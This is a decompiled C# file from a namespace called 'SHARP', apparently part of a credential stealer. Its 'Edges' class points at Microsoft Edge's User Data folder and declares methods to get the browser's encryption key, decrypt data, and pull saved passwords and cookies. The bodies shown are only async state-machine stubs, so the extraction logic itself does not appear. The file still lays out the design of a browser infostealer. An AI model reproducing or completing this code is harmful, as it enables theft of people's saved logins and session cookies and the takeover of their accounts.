﻿using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;

namespace SHARP
{
	// Token: 0x02000020 RID: 32
	internal static class Edges
	{
		// Token: 0x060000BD RID: 189 RVA: 0x0000518C File Offset: 0x0000338C
		private static Task<byte[]> GetEncryptionKey()
		{
			Edges.<GetEncryptionKey>d__3 <GetEncryptionKey>d__;
			<GetEncryptionKey>d__.<>t__builder = AsyncTaskMethodBuilder<byte[]>.Create();
			<GetEncryptionKey>d__.<>1__state = -1;
			<GetEncryptionKey>d__.<>t__builder.Start<Edges.<GetEncryptionKey>d__3>(ref <GetEncryptionKey>d__);
			return <GetEncryptionKey>d__.<>t__builder.Task;
		}

		// Token: 0x060000BE RID: 190 RVA: 0x000051C8 File Offset: 0x000033C8
		private static Task<byte[]> DecryptData(byte[] buffer)
		{
			Edges.<DecryptData>d__4 <DecryptData>d__;
			<DecryptData>d__.<>t__builder = AsyncTaskMethodBuilder<byte[]>.Create();
			<DecryptData>d__.buffer = buffer;
			<DecryptData>d__.<>1__state = -1;
			<DecryptData>d__.<>t__builder.Start<Edges.<DecryptData>d__4>(ref <DecryptData>d__);
			return <DecryptData>d__.<>t__builder.Task;
		}

		// Token: 0x060000BF RID: 191 RVA: 0x0000520C File Offset: 0x0000340C
		internal static Task<PasswordFormat[]> GetPasswords()
		{
			Edges.<GetPasswords>d__5 <GetPasswords>d__;
			<GetPasswords>d__.<>t__builder = AsyncTaskMethodBuilder<PasswordFormat[]>.Create();
			<GetPasswords>d__.<>1__state = -1;
			<GetPasswords>d__.<>t__builder.Start<Edges.<GetPasswords>d__5>(ref <GetPasswords>d__);
			return <GetPasswords>d__.<>t__builder.Task;
		}

		// Token: 0x060000C0 RID: 192 RVA: 0x00005248 File Offset: 0x00003448
		internal static Task<CookieFormat[]> GetCookies()
		{
			Edges.<GetCookies>d__6 <GetCookies>d__;
			<GetCookies>d__.<>t__builder = AsyncTaskMethodBuilder<CookieFormat[]>.Create();
			<GetCookies>d__.<>1__state = -1;
			<GetCookies>d__.<>t__builder.Start<Edges.<GetCookies>d__6>(ref <GetCookies>d__);
			return <GetCookies>d__.<>t__builder.Task;
		}

		// Token: 0x0400004D RID: 77
		private static readonly string BrowserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "User Data");

		// Token: 0x0400004E RID: 78
		private static byte[] _encryptionKey = null;
	}
}
